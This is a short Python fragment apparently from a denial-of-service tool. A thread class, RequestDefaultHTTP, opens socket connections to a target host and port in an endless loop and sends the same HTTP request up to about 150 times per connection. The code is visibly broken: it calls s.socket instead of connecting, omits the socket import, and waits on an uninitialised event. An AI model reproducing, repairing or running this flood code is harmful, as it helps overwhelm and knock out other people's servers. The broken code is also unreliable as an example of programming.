

import threading

class RequestDefaultHTTP(threading.Thread):
    go = threading.Event
    def __init__(self, counter):

        threading.Thread.__init__(self)
        self.counter = counter

    def run(self, go=None):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.socket(str(args.host), int(args.port))
                s.send(str.encode(request))
                print("Request is sent: ", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()
